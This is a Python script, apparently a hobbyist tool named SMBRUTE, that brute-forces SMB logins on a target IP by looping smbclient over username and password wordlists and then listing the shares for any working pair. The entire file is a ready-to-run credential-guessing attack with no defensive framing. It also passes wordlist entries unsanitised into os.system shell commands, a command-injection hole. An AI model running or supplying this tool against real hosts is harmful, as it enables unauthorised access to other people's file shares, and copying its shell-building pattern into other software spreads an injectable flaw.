import os 
import argparse
import sys


banner = """

  /$$$$$$  /$$      /$$ /$$$$$$$  /$$$$$$$  /$$   /$$ /$$$$$$$$ /$$$$$$$$
 /$$__  $$| $$$    /$$$| $$__  $$| $$__  $$| $$  | $$|__  $$__/| $$_____/
| $$  \__/| $$$$  /$$$$| $$  \ $$| $$  \ $$| $$  | $$   | $$   | $$      
|  $$$$$$ | $$ $$/$$ $$| $$$$$$$ | $$$$$$$/| $$  | $$   | $$   | $$$$$   
 \____  $$| $$  $$$| $$| $$__  $$| $$__  $$| $$  | $$   | $$   | $$__/   
 /$$  \ $$| $$\  $ | $$| $$  \ $$| $$  \ $$| $$  | $$   | $$   | $$      
|  $$$$$$/| $$ \/  | $$| $$$$$$$/| $$  | $$|  $$$$$$/   | $$   | $$$$$$$$
 \______/ |__/     |__/|_______/ |__/  |__/ \______/    |__/   |________/
+===========================================================================+                                                                         
+            Code By : Aniket.N.Bhagwate ~ [ NULLBYTE007]                   +
+===========================================================================+                                                                         
                                                                         
"""

def bruteforce(ip , username , password):
	
	found=[]
	
	try:
		users = open(username,'r')
		users = users.read().split("\n")
		users.pop()
	except:
		print("[!]  Unable to open File ==> {}".format(username))
		sys.exit()
		
	try:
		passwd = open(password,'r')
		passwd = passwd.read().split("\n")
		passwd.pop()
	except:
		print("[!]  Unable to open File ==> {}".format(password))
		sys.exit()
		
	os.system("mkdir DUMP")
	for u in users:
		for p in passwd:
			os.system("clear")
			print(banner)
			print("NO OF USERS      : [ {} ] ".format(len(users)))
			print("NO OF PASSWORDS  : [ {} ] \n".format(len(passwd)))
			print("+=============================================================+")
			print("+ TESTING  [\033[30;42m {} \033[m]   :   [\033[30;42m {} \033[m] " .format(u,p))
			print("+=============================================================+")
			if os.system("smbclient -L {} -U {}%{} 1> DUMP/scan.txt 2> DUMP/scan.txt".format(ip,u,p))==0:
				found.append("{}:{}".format(u,p))
				
	os.system("clear")
	os.system("rm -rf DUMP")
	print(banner)
	if found==[]:
		print("[*] NO MATCH FOUND ! ")	
	else:
		print("[!!]MATCH FOUND ! GETTING SHARES ....\n")
		print("+----------------------------------------------------------------------+")
		for x in found:
			u = x.split(":")[0]
			p = x.split(":")[1]
			print("[*] SHARES FOR USER : \033[30;42m {} \033[m  AND PASSWORD : \033[30;42m {} \033[m".format(u,p))
			os.system("smbclient -L {} -U {}%{}".format(ip,u,p))
			print("+----------------------------------------------------------------------+")
	
	print("\n")

def main():
	parser = argparse.ArgumentParser("SMB Bruteforce to get SMB Shares")
	parser.add_argument('-t','--target',metavar='',required=True , help=' IP Address of target Host. ')
	parser.add_argument('-u','--usernames',metavar='',required=True , help='Wordlist with Usernames. ')
	parser.add_argument('-p','--passwords' ,metavar='', required=True , help='Wordlist with Passwords')
	args = parser.parse_args()
	
	bruteforce(args.target , args.usernames , args.passwords)



if __name__=='__main__':
	main()
	


